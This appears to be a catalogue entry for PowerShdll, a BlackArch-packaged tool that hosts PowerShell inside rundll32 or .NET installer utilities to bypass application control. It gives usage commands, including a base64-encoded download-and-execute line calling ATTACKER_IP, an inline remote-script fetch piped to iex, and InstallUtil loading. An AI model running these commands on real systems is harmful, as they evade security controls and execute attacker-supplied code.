---
name: "powershdll"
categories:
  - blackarch-windows
version: "72.62cfa17"
homepage: "https://github.com/p3nt4/PowerShdll"
packaged-by: [blackarch]
blackarch-builddate: "2021-03-20"
build-system: windows
license: MIT
meta-checked: "2026-11-09"
github-repo: "p3nt4/PowerShdll"
github-stars: 1832
github-pushed: "2021-03-17"
github-archived: false
github-issues: 0
github-match: "exact"
gh-checked: "2026-11-07"
worth: 3.2
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# powershdll

> PowerShdll — run PowerShell through its automation DLLs loaded by rundll32 (or installutil/regsvcs), never powershell.exe.

## What it's for

PowerShdll (p3nt4) executes PowerShell when powershell.exe is blocked, removed, or restricted: it is a DLL (and matching standalone exe) that hosts the PowerShell engine through the .NET automation DLLs, launched via `rundll32.exe` or the .NET install utilities (installutil, regsvcs, regasm, regsvr32 — the SubTee techniques) so that application-control rules aimed at powershell.exe and Constrained Language Mode never engage. It gives an interactive console (`-i`/`-w`), runs a `.ps1` from a path (`-f`), or executes an inline expression passed on the command line — the documented pattern being a base64-encoded command decoded and piped to `iex`. DLL mode needs .NET 3.5 (exe mode 2.0). Its quirks matter in the field: some errors are silently swallowed (a failed Import-Module prints nothing), interactive output relies on hijacking the parent's console — hence the `-n` switch to run without output when there is no console, or rundll32 crashes — and rundll32 argument handling means you should keep exactly one space between switches. It is an execution host, not a payload: what runs is whatever script or expression you hand it.

## Typical use cases

### Start an interactive console without powershell.exe

The default rundll32 entry point.

```
rundll32 PowerShdll.dll,main -i
```

Outcome: the PowerShell engine loads inside the rundll32 process and you get a `PS>` prompt in the current console; `-w` instead opens the interactive console in a new window (the default when no arguments are given).

### Run a local .ps1 script

Point it at a script file instead of typing interactively.

```
rundll32 PowerShdll.dll,main -f C:\users\user\script.ps1
```

Outcome: executes `script.ps1` inside the runspace and returns; combine with any download method to stage fresh scripts without re-copying the DLL. `rundll32 PowerShdll.dll,main -h` prints the same usage text.

### Execute a base64-encoded command with no console

The one-shot pattern for agent-driven execution (no interactive console attached).

```
rundll32 PowerShdll-x86.dll,main -n "[System.Text.Encoding]::Default.GetString([System.Convert]::FromBase64String(\"BASE64\")) ^| iex"
```

Outcome: `-n` runs with no console output (preventing the crash that otherwise hits console-less parents), decoding `BASE64` — produced e.g. by `echo -n 'wget http://ATTACKER_IP/exec.ps1 |iex' | base64` — and executing it via `iex`; the documented form for pushing a script-download-and-execute chain through rundll32. Use `[System.Text.Encoding]::Unicode` when the encoded payload is an Empire stager.

### Download and run a remote script inline

No local script file, no console interaction.

```
rundll32 PowerShdll.dll,main . { iwr -useb https://example.com/Script.ps1 } ^| iex;
```

Outcome: fetches `Script.ps1` over HTTPS with Invoke-WebRequest and pipes it straight into `iex` within the rundll32-hosted runspace — the README's scripted-delivery form.

### Run it as a standalone exe or via the .NET installers

When rundll32 itself is watched, the same DLL loads through other hosts.

```
PowerShdll.exe -i
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U PowerShdll.dll
```

Outcome: the first starts the interactive console from the standalone executable form (default `-i`); the second loads the DLL via InstallUtil's uninstall path (use `Framework64` on x64), giving the same runspace without rundll32. regsvcs.exe, regasm.exe and regsvr32.exe work analogously.

*Corpus evidence: download of the x86 DLL and a `rundll32 ... ,main -n` base64 `iex` execution to bypass application control in the corpus index; every example verified against the upstream README.*
